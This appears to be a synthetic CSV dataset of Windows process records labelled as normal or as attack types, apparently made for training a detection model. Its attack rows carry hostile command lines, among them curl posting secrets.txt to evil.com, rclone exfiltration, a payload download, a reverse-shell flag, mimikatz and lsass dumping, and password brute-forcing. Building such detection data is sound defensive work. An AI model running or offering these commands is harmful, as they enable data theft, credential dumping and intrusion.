process_name,cmdline,cpu_usage,memory_usage,pid,ppid,has_network_activity,connection_count,is_system_user,label
locker.exe,locker.exe --wallet bc1qxy...,78.7147108284822,18.30222794670179,56858,6807,0,5,0,ransomware
git.exe,git.exe,16.938941537198314,1.8427365240651725,63118,8559,0,14,0,normal
powershell.exe,powershell.exe,22.409620579286834,11.536733511789889,53426,7290,0,10,1,normal
node.exe,node.exe,28.54548578215703,22.063801599021048,49864,8721,1,4,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,34.58596041953308,20.258958713962222,25166,8093,1,65,0,brute_force
SearchIndexer.exe,SearchIndexer.exe,1.8861771707332298,1.9993487426636407,28709,4835,0,8,0,normal
System,System,4.869404237781309,0.47399646268540463,51173,106,0,4,1,normal
System,System,2.4695660331440985,0.023064952043030107,51171,5079,0,0,0,normal
chrome.exe,chrome.exe,49.37471207620102,29.060022963106594,15027,895,0,4,1,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,65.44040506519534,9.282136131964778,31493,6780,1,119,0,brute_force
cmd.exe,cmd.exe,9.081532808480018,2.4827245763137684,46877,3080,0,12,0,normal
python.exe,python.exe,74.21685416132358,22.979418269082995,20987,3938,0,13,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,9.009003265456336,7.422825760108552,33530,4383,0,11,0,normal
powershell.exe,powershell.exe,34.07396610843538,2.9363140294051773,34924,4142,0,13,0,normal
svchosts.exe,svchosts.exe -connect evil.com,19.683126122595937,11.649836185662108,9443,5627,0,9,0,malware
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,24.600163059697586,21.029721129983297,47084,8723,0,11,0,privilege_escalation
powershell.exe,powershell.exe,41.666596080715095,6.841446533471924,54885,9678,0,14,0,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,49.46038891409362,10.201530532971931,39925,1887,1,13,0,privilege_escalation
git.exe,git.exe,1.4941685291723739,1.5781211901905408,16890,8241,0,12,0,normal
tsc.exe,tsc.exe,13.680390789547193,2.793810397942824,31529,3126,0,13,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,95.05613443292611,19.401787654563876,59809,3615,0,6,0,brute_force
MsMpEng.exe,MsMpEng.exe,11.16405391745162,8.283319323293593,27838,2484,0,13,1,normal
Teams.exe,Teams.exe,19.2978247629683,7.265491473556619,27379,2822,1,2,0,normal
Teams.exe,Teams.exe,5.1945482683169555,13.045120091573786,54370,3580,1,15,1,normal
svchost.exe,svchost.exe -connect 185.141.62.123:443,21.008440455660626,13.094556451467355,14389,5101,1,17,0,trojan
node.exe,node.exe,55.47636365621425,23.47006792033884,52952,2593,0,9,1,normal
webpack.exe,webpack.exe,80.26742011440831,15.482863982822261,32404,3286,1,5,0,normal
bash.exe,bash.exe,31.160947540049214,2.6356121358123668,46690,6541,0,4,1,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,28.20340247491657,21.382852200094185,59007,4592,0,17,0,data_exfiltration
node.exe,node.exe,64.1349324179498,22.6585184374559,8027,9799,1,1,0,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,39.07541448798097,24.94199700585319,55114,5493,1,18,0,data_exfiltration
tsc.exe,tsc.exe,5.216080163240456,4.059709647320522,28441,3370,0,1,1,normal
System,System,0.26182265468876476,0.02599678244176573,32660,2037,0,11,0,normal
Docker Desktop.exe,Docker Desktop.exe,38.058566263403726,8.687638903682277,43344,4591,0,15,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,11.349245893936702,28.132805657442724,16967,7686,0,14,0,data_exfiltration
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,24.510391370357695,8.423025694104041,47831,8160,0,1,0,data_exfiltration
System Idle Process,System Idle Process,82.66625005107467,0.07226548847381793,15654,7598,0,10,0,normal
Docker Desktop.exe,Docker Desktop.exe,13.37864681108162,4.104461820963559,23516,1040,0,1,1,normal
locker.exe,locker.exe --wallet bc1qxy...,81.86752406439048,5.750971450798199,39552,1043,0,5,0,ransomware
devenv.exe,devenv.exe,1.0767993743513848,13.944044551122392,19522,6652,1,6,1,normal
services.exe,services.exe,1.2706545078195246,0.9201134025078939,55445,2027,0,13,1,normal
Docker Desktop.exe,Docker Desktop.exe,13.578764646726672,5.222514673395599,20747,3663,0,6,0,normal
devenv.exe,devenv.exe,28.2204296154671,5.778904201151254,6187,7209,0,9,0,normal
webpack.exe,webpack.exe,99.65309870743417,7.903554482790206,12144,1039,1,15,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,11.628505955775271,29.498429893417857,23393,8864,1,14,0,privilege_escalation
svchosts.exe,svchosts.exe -connect evil.com,31.853275580832516,26.482821950745233,61059,7612,1,15,0,malware
cmd.exe,cmd.exe,18.692065637888334,1.4732490994839986,9547,4332,1,0,1,normal
lsass.exe,lsass.exe,2.5184133948521743,1.304854418784085,9647,988,0,9,1,normal
ransom.exe,ransom.exe --encrypt --payment,82.81858893178432,29.163863525051386,52177,4933,1,5,0,ransomware
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,10.210806226080656,5.676661734574976,10415,9346,1,12,0,data_exfiltration
MSBuild.exe,MSBuild.exe,3.9945122480881667,5.104391523226706,29254,9599,0,12,0,normal
devenv.exe,devenv.exe,50.56737684444373,18.418557916603625,18706,7029,0,15,0,normal
npm.exe,npm.exe,83.099574083187,17.016941916616872,17733,464,0,15,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,69.45187386342003,11.011885417960436,55607,9333,1,482,0,brute_force
System Idle Process,System Idle Process,81.13780420747396,0.055979529075834845,6617,4296,0,9,0,normal
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,61.18384563292743,20.55806445206384,35455,9380,1,98,0,brute_force
git.exe,git.exe,36.51692368282525,1.6652371283964684,62128,2458,1,6,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,11.742788435983105,15.20218463596167,47972,1890,0,19,0,data_exfiltration
backdoor.exe,backdoor.exe --persist,28.162532786854307,7.333983082480723,17560,6519,0,9,0,malware
Docker Desktop.exe,Docker Desktop.exe,23.00932999459559,10.154725404333234,58143,3150,0,5,1,normal
mimikatz.exe,mimikatz.exe lsadump::sam,56.704515768400455,11.868187790018784,59409,6726,1,4,0,malware
backdoor.exe,backdoor.exe --persist,20.62186854395674,5.286897250628498,30547,4591,0,19,0,malware
tsc.exe,tsc.exe,53.30111816961842,1.4213807197098762,42159,2906,1,15,1,normal
svchosts.exe,svchosts.exe -connect evil.com,30.715106170074918,24.567136377236498,62224,9149,1,0,0,malware
npm.exe,npm.exe,97.87426693381572,12.766766025188527,31617,596,1,12,0,normal
chrome_update.exe,chrome_update.exe --no-ui,14.693793899943271,24.07044398620142,19117,6222,0,16,0,trojan
git.exe,git.exe,11.052095712297112,0.8647845291815195,53421,4014,0,0,0,normal
python3.exe,python3.exe,29.76648697141746,16.562890738231086,3629,4832,0,9,0,normal
chrome.exe,chrome.exe,65.78637634071019,10.485109721777226,23353,273,0,1,0,normal
java.exe,java.exe,38.748525806300485,34.64559348054473,37877,3725,0,14,1,normal
python3.exe,python3.exe,93.85590292483356,16.183290630527928,12897,5034,1,5,0,normal
Slack.exe,Slack.exe,2.787957565971158,2.1635317938727257,11899,8320,1,6,0,normal
cmd.exe,cmd.exe,1.5532683712185935,1.2126944317090285,55195,3223,0,10,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,0.8619081352275904,7.831479560093951,34295,5771,0,7,0,normal
SearchIndexer.exe,SearchIndexer.exe,1.676439270721799,2.8515624797136994,36615,2313,1,5,0,normal
System,System,3.0577554400661606,0.24830567204993653,30702,5673,0,14,0,normal
node.exe,node.exe,64.32568635247843,8.731997347646583,19635,1073,0,11,1,normal
MsMpEng.exe,MsMpEng.exe,66.05134208017712,9.159009235761129,29587,2861,1,6,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,10.718515541531168,4.489124787102591,57365,2891,0,9,0,normal
tsc.exe,tsc.exe,92.31348020636455,2.270720558932761,37118,5628,0,4,1,normal
MsMpEng.exe,MsMpEng.exe,60.3641979563895,3.028750492239735,53829,6858,0,3,0,normal
loic.exe,loic.exe --target 192.168.1.1,82.23389884494061,9.968470336774697,63917,4815,1,1953,0,ddos
java.exe,java.exe,63.93854025107245,16.462484026185212,41197,7867,0,8,1,normal
node.exe,node.exe,75.61868119014163,14.41978679466753,37788,8168,0,7,0,normal
Code.exe,Code.exe,15.441068021322907,2.16163954948248,36232,7727,0,15,1,normal
chrome.exe,chrome.exe,55.45511143180936,9.86923141438287,10840,4350,0,12,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,15.472768495556945,14.585627246312782,40424,8858,0,14,1,normal
MSBuild.exe,MSBuild.exe,94.42491168879074,16.83495743950995,42996,2491,0,1,0,normal
SearchIndexer.exe,SearchIndexer.exe,19.669584160035107,2.8540583025964943,40421,3691,0,2,1,normal
SearchIndexer.exe,SearchIndexer.exe,16.30367327331032,3.312946136708816,34718,7419,0,4,0,normal
wsl.exe,wsl.exe,38.53345667377354,2.341765233573243,20470,987,0,12,0,normal
encrypt.exe,encrypt.exe --recursive C:\Users,90.87106945919498,10.41006326948707,31246,2978,0,15,0,ransomware
System,System,0.7992607141949315,0.3492501502318068,40502,4745,0,3,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,17.34711849544469,12.674208623199945,22083,2323,0,1,0,data_exfiltration
git.exe,git.exe,19.9025882304315,4.485494247796732,35323,1457,0,15,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,37.400088790812674,10.748043521233956,46021,2757,0,0,0,privilege_escalation
cryptor.exe,cryptor.exe -aes256 -all,99.91782468263564,13.222281371264945,20069,6457,0,13,0,ransomware
firefox.exe,firefox.exe,1.6891930142959999,19.728527280134447,49805,7652,0,14,1,normal
node.exe,node.exe,44.320414462802304,2.2396352187596786,58927,9299,0,6,0,normal
SearchIndexer.exe,SearchIndexer.exe,15.697403837089778,4.2835081349766595,13162,3489,0,10,0,normal
java.exe,java.exe,67.21011958272253,28.07471486055267,61904,8945,0,15,0,normal
python3.exe,python3.exe,97.56173255018123,18.22851997174072,55091,7164,0,4,1,normal
webpack.exe,webpack.exe,43.67205844908245,7.685078250546313,61251,5224,0,6,0,normal
System Idle Process,System Idle Process,87.68993179331389,0.065843464061403,32785,6314,1,12,1,normal
OUTLOOK.EXE,OUTLOOK.EXE,29.687543121850855,10.03179338688505,32897,8479,0,3,1,normal
cryptor.exe,cryptor.exe -aes256 -all,81.88141366028644,9.394764707962896,14532,7074,1,10,0,ransomware
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,98.60446871119956,9.839756118393934,7891,7054,0,17,0,brute_force
python.exe,python.exe,69.88385115775256,6.4202721833321625,38058,7855,1,10,1,normal
msedge.exe,msedge.exe,36.97721294560209,8.427790048860865,46080,9147,0,0,1,normal
Code.exe,Code.exe,16.04526437016642,8.400545754404769,50240,371,0,6,0,normal
services.exe,services.exe,0.04969453221914466,0.6857559999979917,21465,7901,1,8,1,normal
python.exe,python.exe,8.051038942491173,25.864599611867135,59721,3260,0,3,1,normal
Code.exe,Code.exe,7.6658595806888385,13.689873477425797,59995,2960,1,15,0,normal
chrome.exe,chrome.exe,60.416840576534554,28.212724286219473,35699,901,1,2,1,normal
devenv.exe,devenv.exe,49.50952534903163,16.019637340126415,24387,5468,1,9,0,normal
python.exe,python.exe,44.488914676289845,10.731133918253871,32873,2652,0,11,1,normal
node.exe,node.exe,77.05473881257784,22.32984580250952,20592,5377,0,1,0,normal
john.exe,john.exe --wordlist=rockyou.txt hashes.txt,85.39344194367135,19.92645338824818,49516,2752,0,9,0,brute_force
csrss.exe,csrss.exe,2.5300468081910505,0.9138926103662596,63909,9268,0,12,0,normal
ransom.exe,ransom.exe --encrypt --payment,60.81978281500341,13.449715432447693,39315,8469,0,11,0,ransomware
MSBuild.exe,MSBuild.exe,67.42908916930939,9.12637150808219,24227,7934,0,14,1,normal
tsc.exe,tsc.exe,88.52446874636163,4.7335887761460915,9138,5916,0,3,1,normal
dwm.exe,dwm.exe,24.17174910797753,3.347139596584592,12909,2807,1,15,0,normal
node.exe,node.exe,65.79403771782147,5.806396283996677,22417,5108,1,7,0,normal
svchost.exe,svchost.exe,12.839316929452309,0.8496391133145093,43130,3524,0,8,1,normal
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,43.008581833728456,14.587528704091683,1973,2749,0,20,0,brute_force
python3.exe,python3.exe,52.7489680807525,23.083265890027068,326,6734,0,13,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,0.3406054457735952,4.915421844415139,5603,9630,0,6,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,9.290370926487409,26.52714723458123,1614,8429,0,0,0,data_exfiltration
stress.exe,stress.exe --cpu 16 --flood,90.10643388860794,27.720398609740073,40759,6692,1,937,0,ddos
csrss.exe,csrss.exe,2.7532613825676577,0.5820058581854554,36771,7833,0,15,1,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,21.605501011699637,5.039435746691324,1516,4153,0,19,0,data_exfiltration
cmd.exe,cmd.exe,13.017369974244113,1.6257986644920033,50812,1997,0,8,0,normal
tsc.exe,tsc.exe,93.29141644781636,10.207491103368938,4138,4416,0,8,0,normal
git.exe,git.exe,37.23825999180007,4.181049638950139,29393,4679,0,12,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,14.864709700817556,10.3215259827301,61982,8361,0,5,0,data_exfiltration
tsc.exe,tsc.exe,37.56964143265806,11.775078995049588,35547,6996,0,7,0,normal
System,System,4.413248586608459,0.16493615574718712,23595,3561,0,3,0,normal
payload.exe,payload.exe --silent,50.80219187340339,19.491132397279483,31088,2264,0,11,0,malware
svchost.exe,svchost.exe,8.991855951325483,1.359552175548716,20014,5405,0,12,1,normal
chrome_update.exe,chrome_update.exe --no-ui,11.466658562871364,29.908233781478835,17313,5804,0,4,0,trojan
mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,30.828771950884637,6.750636835848726,57204,9020,0,5,0,malware
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,32.63344549549667,17.74869941565218,8161,2709,1,9,0,data_exfiltration
Code.exe,Code.exe,40.43878218642897,5.080467832226152,30979,66,1,3,0,normal
dwm.exe,dwm.exe,21.192704198850162,7.1775403636237405,25103,4233,1,11,0,normal
printspoofer.exe,printspoofer.exe -i -c cmd,37.44197147164131,14.918576114741082,17953,2403,1,0,0,privilege_escalation
explorer.exe,explorer.exe,2.5476482660696775,3.943543431884966,55050,5541,0,12,1,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,17.905937162623992,28.39771039051929,46111,2753,1,2,0,data_exfiltration
tsc.exe,tsc.exe,94.53642158309094,1.0507086193162105,16728,1889,1,14,0,normal
payload.exe,payload.exe --silent,48.61152173002519,10.139361610776433,17405,1247,0,7,0,malware
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,62.95304498273436,15.490675795473631,18317,8101,1,17,0,brute_force
docker.exe,docker.exe,40.71578864351966,7.4673987071521895,11134,3107,1,8,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,24.838044107807047,21.755948238472712,4219,5550,0,0,0,trojan
dwm.exe,dwm.exe,6.640412343060986,3.6905689868413325,64192,6371,1,11,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,6.83146637426017,8.596382110683138,14943,7177,0,9,0,normal
ransom.exe,ransom.exe --encrypt --payment,72.35830191199817,22.056925323078296,37381,4078,0,13,0,ransomware
powershell.exe,powershell.exe,26.417037202268286,11.238876082363122,25233,787,0,8,1,normal
tsc.exe,tsc.exe,20.426641121649126,8.439930102387303,15437,9527,1,4,0,normal
python3.exe,python3.exe,92.46854242241885,21.251461768347557,13568,27,0,4,0,normal
explorer.exe,explorer.exe,1.019229452749525,1.1837557554421911,16373,343,1,3,0,normal
MSBuild.exe,MSBuild.exe,1.7980361075542795,2.315695904190763,22155,9015,0,5,0,normal
bash.exe,bash.exe,49.14612308967481,3.3899906730890965,33844,6273,0,8,0,normal
MSBuild.exe,MSBuild.exe,45.407422857533355,17.094074690408274,19414,1145,0,12,0,normal
node.exe,node.exe,43.473640265605106,8.730415303626335,8728,9248,0,8,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,50.385856816280835,19.824777035951364,173,500,0,9,0,data_exfiltration
lsass.exe,lsass.exe,1.3019194775608804,0.7516083512537558,5910,8702,1,14,0,normal
MSBuild.exe,MSBuild.exe,78.73779883926655,5.965563353439618,49621,4984,1,10,0,normal
firefox.exe,firefox.exe,21.744630169129543,20.735517812292798,58268,5335,1,14,0,normal
python3.exe,python3.exe,21.252435839092797,10.118338677805077,31082,5378,0,13,0,normal
loic.exe,loic.exe --target 192.168.1.1,75.74319359869484,9.308512843600035,35748,2205,1,1006,0,ddos
svchost.exe,svchost.exe,10.044877886046546,2.8830559187620928,3311,249,1,11,0,normal
Teams.exe,Teams.exe,14.656336627840192,11.627497508733722,41410,5584,0,14,0,normal
psexec.exe,psexec.exe \\target -s cmd.exe,32.41330639653103,23.18010581003142,41265,6019,1,9,0,privilege_escalation
Slack.exe,Slack.exe,21.076956080586505,13.896346192504279,9402,5258,0,3,0,normal
svchosts.exe,svchosts.exe -connect evil.com,30.992508778791304,14.099706040371123,48288,2855,0,3,0,malware
procdump.exe,procdump.exe -ma lsass.exe lsass.dmp,51.19502748486863,8.069714586818463,31203,804,1,11,0,privilege_escalation
python3.exe,python3.exe,9.229450901217263,27.344244016885863,33030,200,0,12,0,normal
Slack.exe,Slack.exe,10.52718468991187,5.000629118824007,62001,4274,0,14,0,normal
git.exe,git.exe,39.079996579353214,1.3110518835984204,48352,5584,0,9,1,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,95.2141634439559,5.152098838510254,42511,9623,0,11,0,brute_force
mimikatz.exe,mimikatz.exe lsadump::sam,49.691103414973675,17.98537177404298,33080,3730,1,11,0,malware
svchosts.exe,svchosts.exe -connect evil.com,29.29345458068849,8.168357851981146,36703,1715,0,18,0,malware
System Idle Process,System Idle Process,85.21553906696741,0.029949251504299015,28076,7876,0,4,1,normal
System,System,3.5528483172087792,0.11530568074737069,61072,4938,1,10,0,normal
git.exe,git.exe,18.813279996571612,4.984130400152113,63858,8235,0,2,1,normal
System,System,1.5285048231052834,0.10688289638282372,34425,4056,0,8,0,normal
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,14.775753050045603,6.821967885952769,15106,9326,0,9,0,data_exfiltration
curl.exe,curl.exe -X POST -d @secrets.txt http://evil.com,14.779277258527376,12.85028127805587,264,3243,1,1,0,data_exfiltration
firefox.exe,firefox.exe,14.314325402549281,17.8467527623715,34142,7588,1,10,1,normal
hping.exe,hping.exe --flood -p 80 target.com,80.27599179789331,13.60095156481036,20189,8001,1,3544,0,ddos
docker.exe,docker.exe,8.397580680555533,4.741812750513866,52632,4651,0,15,0,normal
java.exe,java.exe,98.32712842372754,8.261079638602972,14481,2673,0,4,1,normal
webpack.exe,webpack.exe,95.43863957841239,7.0683268148668255,51447,6751,0,15,0,normal
Docker Desktop.exe,Docker Desktop.exe,32.02787515802517,8.472376019636066,48746,9735,0,2,1,normal
Slack.exe,Slack.exe,15.401233200370845,13.7610291850224,44545,4023,0,9,0,normal
Docker Desktop.exe,Docker Desktop.exe,37.92208573197106,7.76284836030657,13698,6428,0,9,0,normal
hashcat.exe,hashcat.exe -m 1000 hash.txt wordlist.txt,99.05504344884207,10.282934097302705,51023,1331,1,0,0,brute_force
python3.exe,python3.exe,23.249877921686025,1.8794120945139294,61601,8149,0,3,0,normal
winpeas.exe,winpeas.exe,66.56655776225811,16.36797817238334,60503,7819,1,9,0,privilege_escalation
System Idle Process,System Idle Process,84.11609435182977,0.02285312609060769,45897,847,0,0,1,normal
psexec.exe,psexec.exe \\target -s cmd.exe,34.186945946248265,14.873996736968053,52667,2094,1,16,0,privilege_escalation
devenv.exe,devenv.exe,17.510364957009635,10.492939472746812,25952,9584,0,6,1,normal
ftp.exe,ftp.exe -s:script.txt evil-server.com,14.13594063065897,20.3921709659679,16765,8517,1,15,0,data_exfiltration
cmd.exe,cmd.exe,11.18302917783248,0.9576950829417002,20589,1540,1,4,0,normal
chrome.exe,chrome.exe,53.3286416278336,17.807287778546222,43000,6976,1,12,1,normal
cmd.exe,cmd.exe,15.593264050027605,1.0944923789465688,33230,1076,0,10,1,normal
MsMpEng.exe,MsMpEng.exe,65.97315244667476,5.900076776475549,50933,7969,0,12,0,normal
Discord.exe,Discord.exe,19.3252247341399,3.1616398212640577,46491,3384,0,8,0,normal
cmd.exe,cmd.exe,26.439646380157846,1.6099701400213509,48223,7226,1,5,0,normal
System,System,0.393535483791293,0.39071253252176147,28612,602,0,14,1,normal
csrss.exe,csrss.exe,1.2444168741733432,0.8115258739002249,37603,8260,1,6,0,normal
lsass.exe,lsass.exe,4.7910424457520335,0.3637253351938171,44468,3712,0,11,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,26.576999284260978,18.33186943651748,51937,9102,0,20,0,data_exfiltration
python3.exe,python3.exe,47.60657162705265,13.73433274753909,49776,8659,1,4,0,normal
Docker Desktop.exe,Docker Desktop.exe,10.553663895495076,13.644411977934995,21556,4845,0,13,1,normal
java.exe,java.exe,94.58612933776588,25.098721265204063,40337,4025,0,4,0,normal
webpack.exe,webpack.exe,22.800143072786796,9.634030534845824,40383,2153,1,10,0,normal
git.exe,git.exe,29.84666244469828,1.4991654277874975,13676,6943,1,1,0,normal
scvhost.exe,scvhost.exe,16.4614555575434,14.31774037935692,55660,689,0,6,0,malware
node.exe,node.exe,68.8398285923705,12.655372493483513,12027,6046,1,2,0,normal
firefox.exe,firefox.exe,48.11442501099311,14.109852774001393,661,1437,0,1,1,normal
encrypt.exe,encrypt.exe --recursive C:\Users,76.40109284659442,22.575492849310034,12598,1569,1,16,0,ransomware
tsc.exe,tsc.exe,35.890755054233395,10.746686569868483,21928,9515,0,4,0,normal
firefox.exe,firefox.exe,40.587785038540304,17.356283396714083,43125,548,0,13,0,normal
python.exe,python.exe,23.27176931281064,10.462264228674428,9194,9990,1,5,0,normal
svchost.exe,svchost.exe,11.48368019985414,0.1437094045029108,31308,286,1,13,0,normal
firefox.exe,firefox.exe,56.73018753405831,6.900138435699911,47684,9402,0,4,1,normal
locker.exe,locker.exe --wallet bc1qxy...,86.07663682666538,21.41883708287685,60818,4586,0,14,0,ransomware
medusa.exe,medusa.exe -h 10.0.0.1 -u admin -P passwords.txt,25.03806956300428,27.296596319530337,56013,3427,1,19,0,brute_force
Slack.exe,Slack.exe,11.560843265285994,2.8132349138942083,3412,1738,0,14,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,23.20798504553875,7.209494224762451,34651,702,1,4,1,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,30.841907444801855,17.867450367049045,20855,1129,1,8,0,privilege_escalation
chrome.exe,chrome.exe,61.679217493355715,27.979891952380665,25798,3450,1,15,1,normal
MsMpEng.exe,MsMpEng.exe,63.27509271335735,2.1678448542986617,31005,3780,0,12,0,normal
firefox.exe,firefox.exe,27.636489986934734,20.959389323769187,49918,3354,0,10,1,normal
node.exe,node.exe,19.961831442258514,10.630186566478827,64689,4741,0,14,0,normal
wsl.exe,wsl.exe,45.29947764359838,6.58643979579636,21381,4088,1,0,0,normal
lsass.exe,lsass.exe,1.8769247968051022,1.5264453929642143,16773,1841,0,4,0,normal
System Idle Process,System Idle Process,81.46863455241063,0.05418004906627571,38258,2821,0,6,0,normal
docker.exe,docker.exe,39.42153010178109,6.565332575761368,34042,9579,0,15,1,normal
rclone.exe,rclone.exe copy C:\Confidential remote:exfil,42.08665039976282,8.314280313619644,36036,2222,1,18,0,data_exfiltration
chrome_update.exe,chrome_update.exe --no-ui,22.780794597940655,12.060713855659142,30514,5921,1,0,0,trojan
Discord.exe,Discord.exe,2.5449618270372314,8.48674096511104,30081,210,1,4,0,normal
explorer.exe,explorer.exe,4.404803685401321,2.949461925212007,18126,6464,1,7,0,normal
explorer.exe,explorer.exe,3.5222319675519786,2.127857480374473,32390,4538,1,13,0,normal
WindowsTerminal.exe,WindowsTerminal.exe,24.099308308199177,1.80147102910003,48133,4736,0,4,1,normal
devenv.exe,devenv.exe,41.18106065682216,10.065207008608416,5550,3973,1,6,0,normal
Docker Desktop.exe,Docker Desktop.exe,27.320598659707287,11.935369545384956,14882,9316,0,2,0,normal
System,System,4.806296103845056,0.3276053524585788,25510,7233,0,14,0,normal
chrome.exe,chrome.exe,16.915545688382508,23.295111069109474,15646,1663,0,1,1,normal
wsl.exe,wsl.exe,21.89090982588443,6.11131467894782,44042,3822,0,6,0,normal
node.exe,node.exe,3.2073749860609735,19.977577227063428,40252,5333,0,12,0,normal
MsMpEng.exe,MsMpEng.exe,74.34166338572639,3.0437309764179927,36254,2467,0,2,1,normal
Code.exe,Code.exe,23.996737837278037,4.489340276335767,63052,2879,0,3,0,normal
chrome.exe,chrome.exe,37.76005870870505,14.747906024013947,41498,9781,0,6,0,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,36.041702519453736,24.056943816435968,47141,6153,0,17,0,privilege_escalation
explorer.exe,explorer.exe,8.51378841752781,4.592052310146154,64996,9942,0,8,0,normal
Code.exe,Code.exe,28.33576414085448,13.998213821920412,27578,2711,0,3,1,normal
juicypotato.exe,juicypotato.exe -l 1337 -p cmd.exe,46.35393013282982,14.22585720516739,21176,7028,0,3,0,privilege_escalation
System Idle Process,System Idle Process,80.53564480230538,0.042993141721609535,2841,8815,0,6,0,normal
helper.exe,helper.exe --reverse-shell 10.0.0.1:4444,7.3115257591202525,15.291710225119372,3090,992,0,11,0,trojan
services.exe,services.exe,0.14305169292998632,0.6757486263888818,25197,111,0,12,0,normal
tsc.exe,tsc.exe,63.777418981760036,7.853975806228911,28236,1602,0,1,0,normal
ransom.exe,ransom.exe --encrypt --payment,77.29019254234245,18.84385751310689,57038,7798,1,0,0,ransomware
svchost.exe,svchost.exe -connect 185.141.62.123:443,26.29788292790046,14.376988290140925,48180,1823,1,13,0,trojan
update.exe,update.exe --silent --download http://evil.com/payload,26.242014234833796,20.428859285602083,22255,3533,0,1,0,trojan
cmd.exe,cmd.exe,16.253763958679816,1.6130158065842712,21205,5603,0,14,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,17.021947167062876,2.6401930480909295,48057,4337,0,5,0,normal
webpack.exe,webpack.exe,67.22655121587276,14.449368768253823,15914,2432,0,2,0,normal
services.exe,services.exe,0.4221488751179443,0.32424327842309764,25269,2339,0,3,1,normal
docker.exe,docker.exe,46.6506610107813,8.76961294587183,56844,8540,1,10,1,normal
hping.exe,hping.exe --flood -p 80 target.com,94.29426675976397,28.22768224375327,47532,3867,1,1019,0,ddos
scvhost.exe,scvhost.exe,29.95747338205498,13.845286755584345,30122,2114,1,0,0,malware
powershell.exe,powershell.exe,5.9286104030654325,6.383613075691871,18135,2616,1,7,0,normal
msedge.exe,msedge.exe,31.70398099559878,7.0186399057243465,55747,178,0,10,0,normal
python.exe,python.exe,69.57594315285061,11.050473458088604,11324,9282,0,13,0,normal
MsMpEng.exe,MsMpEng.exe,52.68751108997148,3.0388388591390196,14155,5546,0,14,0,normal
OUTLOOK.EXE,OUTLOOK.EXE,16.161582871801762,8.103877011882865,13610,5561,0,12,1,normal
powershell.exe,powershell.exe -encodedcommand JABjAGwAaQBlAG4AdAA=,37.41697251928063,10.95008440278355,20030,5257,0,15,0,privilege_escalation
hydra.exe,hydra.exe -l admin -P wordlist.txt ssh://target,54.54344103433215,6.032241717292834,21783,5761,1,341,0,brute_force
